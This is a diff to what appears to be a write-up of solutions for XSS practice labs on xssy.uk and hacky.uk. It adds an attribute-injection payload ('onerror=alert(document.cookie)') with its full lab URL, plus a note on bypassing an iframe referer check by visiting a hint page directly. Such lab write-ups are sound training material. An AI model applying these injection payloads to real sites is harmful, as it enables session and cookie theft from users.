@@ -252,6 +252,32 @@ https://se64r6zd.xssy.uk/target.ftl?search=javascript%3Aalert(document.cookie)#t
 
 ---
 
+### Lab 766: New Dealer
+- **URL Lab**: [https://xssy.uk/lab/769](https://hacky.uk/lab/766)
+- **Payload**: 
+```javascript
+#tracker' onerror='alert(document.cookie)
+```
+- **Full URL**: 
+```
+https://m7wjtxu4.hacky.uk/target.ftl?search=#tracker' onerror='alert(document.cookie)
+```
+---
+
+### Lab 1738: Need a hint?
+- **URL Lab**: [https://xssy.uk/lab/769](https://hacky.uk/lab/1738)
+- **Payload**: 
+```javascript
+Direct access to parh https://achnsxdt.hacky.uk/hint.html
+because bypass checking iframe referer validation
+```
+- **Full URL**: 
+```
+https://achnsxdt.hacky.uk/hint.html
+```
+
+
+
 ## Apprentice Level
 
 ### Lab 7: Double Decode XSS
